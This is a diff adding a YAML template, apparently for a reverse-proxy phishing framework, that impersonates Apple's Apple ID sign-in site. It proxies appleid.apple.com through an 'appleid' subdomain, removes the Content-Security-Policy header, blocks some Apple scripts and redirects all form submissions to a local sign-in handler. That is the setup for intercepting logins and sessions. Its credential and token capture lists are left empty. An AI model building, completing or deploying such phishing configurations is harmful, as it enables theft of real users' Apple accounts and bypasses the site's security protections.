@@ -1,0 +1,19 @@
+name: "Apple-ID"
+author: "Vanta v5"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "appleid"
+    target: "appleid.apple.com"
+auth_urls: ["/"]
+landing_path: ["/"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites: []
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|/ac/globalnav/|/static/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action]", action_to: "/auth/signin"}
